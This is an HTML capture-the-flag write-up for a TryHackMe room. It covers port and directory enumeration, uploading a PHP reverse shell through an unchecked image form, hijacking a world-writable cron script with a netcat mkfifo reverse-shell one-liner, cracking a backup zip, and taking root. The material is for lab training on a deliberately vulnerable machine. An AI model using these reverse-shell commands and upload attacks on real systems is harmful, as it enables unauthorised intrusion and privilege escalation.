I"´K<h3 id="username-hashghost">username: <a href="https://tryhackme.com/p/hashghost">hashghost</a></h3>

<h1 id="introduction">Introduction</h1>
<p>This room was created by <a href="https://peterchain7.github.io/">peterchain</a> in <a href="https://tryhackme.com/room/owaspquiz">trychckme</a> platform itâ€™s difficulty level was easy.</p>

<p>Lets start with enumerations as it was proposed</p>

<h2 id="nmap-scan">nmap scan</h2>
<hr />
<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nmap -sC -sV 10.10.176.162 -oN nmap-scan
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]
â””â”€$ cat nmap-scan

# Nmap 7.92 scan initiated Sat May 14 17:02:25 2022 as: nmap -sC -sV -oN nmap-scan 10.10.176.162
Nmap scan report for 10.10.176.162
Host is up (0.17s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT STATE SERVICE VERSION
20/tcp closed ftp-data
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 f0:c0:cd:b4:9a:8d:c9:8d:3e:59:0a:a6:f6:90:98:f7 (RSA)
| 256 17:b2:38:4d:f0:d5:d3:4a:a9:15:96:88:aa:d8:25:2b (ECDSA)
|_ 256 38:99:59:33:67:ea:c6:e6:24:be:62:70:12:ec:3e:ac (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-title: home - Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp closed https
3306/tcp closed mysql
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 14 17:02:52 2022 -- 1 IP address (1 host up) scanned in 27.20 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Then this is web, it is running on port 80 and it is open. It contains some other ports open but they can not help us for now.</p>

<h2 id="gobuster-scan">Gobuster scan</h2>
<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>gobuster dir -u http://10.10.176.162/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -t 40 -f -x php -o gobuster
</pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<p><strong>Results</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]
â””â”€$ cat gobuster
/uploads/ (Status: 200) [Size: 59]
/assets/ (Status: 200) [Size: 1116]
/gallery.php (Status: 200) [Size: 4354]
/admin/ (Status: 200) [Size: 3991]
/images/ (Status: 200) [Size: 1936]
/index.php (Status: 200) [Size: 16312]
/icons/ (Status: 403) [Size: 278]
/server-status/ (Status: 403) [Size: 278
</pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<p>Here we have some useful directories but we can continue to bruteforce recusively with additional option which will help us to bruteforce other directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.176.162/admin <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt <span class="nt">-t</span> 40 <span class="nt">-f</span> <span class="nt">-x</span> php <span class="nt">-o</span> gobuster-admin
</pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<p><strong>Results</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]
â””â”€$ cat gobuster-admin
/assets/ (Status: 200) [Size: 2090]
/home.php (Status: 302) [Size: 8846] [--&gt; logout.php]
/logout.php (Status: 302) [Size: 0] [--&gt; index.php]
/index.php (Status: 200) [Size: 3991]
/header.php (Status: 302) [Size: 4] [--&gt; logout.php]
/slider.php (Status: 200) [Size: 22426]
</pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<p>Here we get some usefull directories attached to the admin directory. If we try to visit this directory we will find some valuable details but the most intended directory will be <code class="language-plaintext highlighter-rouge">/admin/slider.php</code></p>

<p><strong>Visit the admin/slider.php</strong></p>

<p>In this page we can upload file and instructions specifies that it is image upload, but what if we can upload any file example a php file with malicious codes which can give us reverse shell.</p>

<p><img src="https://i.imgur.com/59NR64f.png" alt="" /></p>

<p>Then i decided to upload the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey</a> php reverse shell which will give us a reverse shell.</p>

<blockquote>

  <p>Before uploadding a reverse shell payload from pentestmonkey make sure you are listenning with
netcat through the following</p>
</blockquote>

<hr />

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]
â””â”€$ nc -nvlp 1234
listening on [any] 1234 ...
</pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<p>After uploading it it will prompt the following message</p>

<p><img src="https://i.imgur.com/G76WtKR.png" alt="" /></p>

<p>Then for us to get the shell we have to make sure that the php reverse shell payload is executing and this can be done by know/identify where excatly the script is uploaded. On the image above it seems the slider has been added to gallery and in the dir bruteforcing we got <code class="language-plaintext highlighter-rouge">gallery.php</code> so we will go to that page and refresh it.</p>

<p><img src="https://i.imgur.com/09IOZ9e.png" alt="" /></p>

<p>And on our netcat we have a shell</p>

<p><img src="https://i.imgur.com/yIEkAbn.png" alt="" /></p>

<p><strong>We are in.</strong></p>

<h2 id="stabilize-shell">Stabilize shell.</h2>
<hr />

<p>Now we have shell but it is not stable, meaning if we press ctr+c the shell will disappear and here are the steps to stabilize it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>$ python -c 'import pty;pty.spawn("/bin/bash")'
batman@owaspQuiz:/$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
&lt;l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
batman@owaspQuiz:/$ export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'export TERM=xterm-256color
batman@owaspQuiz:/$
batman@owaspQuiz:/$ ^Z
zsh: suspended nc -nvlp 1234
â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]
â””â”€$ stty raw -echo;fg;reset
[1] + continued nc -nvlp 1234
batman@owaspQuiz:/$
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Then we are good now and can continue with privilege escalation.</p>

<p>Check whoami with which commands we can run with sudo.</p>

<p><img src="https://i.imgur.com/QNu61Ca.png" alt="" /></p>

<p>We can not view because the batman requires password and we donâ€™t have.</p>

<p>Then we will check some other interesting files including flags.</p>

<p><img src="https://i.imgur.com/YtO4vsr.png" alt="" /></p>

<p>After listing some folders we discovered that they are two users in our machine user <code class="language-plaintext highlighter-rouge">batman</code> and user <code class="language-plaintext highlighter-rouge">munojr</code></p>

<p>On munojr homeâ€™s directory there is our first flag then we will try to read it.</p>

<p><img src="https://i.imgur.com/pHEL629.png" alt="" /></p>

<p>We can not read the file then lets check the cron jobs.</p>

<h2 id="user-privilege-escalation">User privilege escalation.</h2>

<hr />

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>batman@owaspQuiz:/home/munojr$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user command
17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
* * * * * munojr /opt/munoupdate.sh
#
batman@owaspQuiz:/home/munojr$
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Interesting there is a script in crontab which runs in every minute and it has named as <code class="language-plaintext highlighter-rouge">munoupdate.sh</code></p>

<p>Lets read the file permission and check if we can write it</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="gp">batman@owaspQuiz:/home/munojr$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/munoupdate.sh
<span class="go">-rwxr-xrwx 1 munojr munojr 845 May 13 15:05 /opt/munoupdate.sh
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Bravo!! we can write on the script then lets read first before changing it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre>batman@owaspQuiz:/home/munojr$ cat /opt/munoupdate.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.17.17.62 8000 &gt;/tmp/f
#!/bin/bash
startupdate() {
echo

echo "-----------------------------------------"

echo "&gt;&gt;&gt; Command Execting Was Successful. &lt;&lt;&lt;"

echo "-----------------------------------------"

echo
}

start() {
echo
echo "***&gt;&gt;&gt; Updating The Operating System &lt;&lt;&lt;***"
echo
}

exitUpdate() {
echo
echo "-------------------------------------------------------"
echo "&gt;&gt;&gt; Operating System Update Has Been Completed &lt;&lt;&lt;"
echo "-------------------------------------------------------"
echo
exit 1
}

#calls the functions
start
startupdate
exitUpdate
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<p>This script has some update functions but there is reverse shell payload</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.17.17.62 8000 &gt;/tmp/f

</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<p>We can use the payload and listen for the munojr shell, in my case i changed into the following ip address</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.11.230 1122 &gt;/tmp/f

</pre></td></tr></tbody></table></code></pre></div></div>

<p>and then listening to with netcat.</p>

<blockquote>
  <p>When you start netcat you have to wait for one minute so that you can have a reverse shell.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>
â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]

â””â”€$ nc -nvlp 1122

listening on [any] 1122 ...

connect to [10.9.11.230] from (UNKNOWN) [10.10.8.200] 52262

/bin/sh: 0: can't access tty; job control turned off

$

</pre></td></tr></tbody></table></code></pre></div></div>

<p>We now have a shell then we will stabilize as usual and after it lets read the user.txt file first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>
munojr@owaspQuiz:~$ ls
todo.txt user.txt
munojr@owaspQuiz:~$ cat user.txt
THM{REDACTED}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now we are half of the journey lets continue to the escalation to root user.</p>

<h2 id="root-privilege-escalation">Root privilege escalation.</h2>

<hr />

<p>On munojr home directory they were two files and we read only user.txt then lets read todo.txt file</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>munojr@owaspQuiz:~$ cat todo.txt
Hey; munojr I wahttps://addons.mozilla.org/en-US/firefox/addon/shodan_io/nt you to automate system updates, kindly make sure our script is secure!!
regards peterChain!!
Your current password is : [Redacted]
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<p>This was a message showing that there is a file that have a password for root user.</p>

<p>Then after seeing this message i decided to check for the <code class="language-plaintext highlighter-rouge">/var/backups</code> file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>munojr@owaspQuiz:~$ cd /var/backups/
munojr@owaspQuiz:/var/backups$ ls
s3cr3t.zip
munojr@owaspQuiz:/var/backups$
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<p>Lets unzip it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>munojr@owaspQuiz:/var/backups$ unzip s3cr3t.zip
Archive: s3cr3t.zip
checkdir error: cannot create munojr
Permission denied
unable to process munojr/.
[s3cr3t.zip] munojr/rootpass.txt password:
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<p>It failed to unzip because it requires password and we do not have munojrâ€™s password.</p>

<p>Lets crack it but we have to send it first to <strong>our machine(your computer)</strong>.</p>

<p>I tried to send it with python3 server it failed then i decided to use base64 method with command.</p>

<hr />

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>base64 -w0 s3cr3t.zip
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="https://i.imgur.com/gKmBvqL.png" alt="" /></p>

<p>Then copy it to your machine and save it with .zip extension mine was <strong>s3cr3t.zip</strong></p>

<h2 id="bruteforcing-password">Bruteforcing password</h2>

<hr />

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]
â””â”€$ fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt s3cret.zip
'munojr/' is not encrypted, skipping
found file 'munojr/rootpass.txt', (size cp/uc 47/ 35, flags 9, chk 833c)
checking pw 055470056
PASSWORD FOUND!!!!: pw == *******
</pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<p>unzip the s3cret.txt</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]
â””â”€$ unzip s3cret.zip
Archive: s3cret.zip
creating: munojr/
[s3cret.zip] munojr/rootpass.txt password:
extracting: munojr/rootpass.txt
â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain]
â””â”€$ cd munojr
â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain/munojr]
â””â”€$ ls
rootpass.txt
â”Œâ”€â”€(gemstoneã‰¿kali)-[~/C7F5/thm/chain/munojr]
â””â”€$ cat rootpass.txt
root:***********
</pre></td></tr></tbody></table></code></pre></div></div>
<hr />
<p>now we have root password then we can be root by just <code class="language-plaintext highlighter-rouge">su root</code> and password will be the one we get from rootpass.txt.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>munojr@owaspQuiz:~$ su root
Password:
root@owaspQuiz:/home/munojr# cd /root
root@owaspQuiz:~# ls
root.txt
root@owaspQuiz:~# cat root.txt
THM{REDACTED}
root@owaspQuiz:~#

</pre></td></tr></tbody></table></code></pre></div></div>

<p><strong>The End</strong>.</p>

<p>Thanks for reading, you can check me on .see you next time.</p>
:ET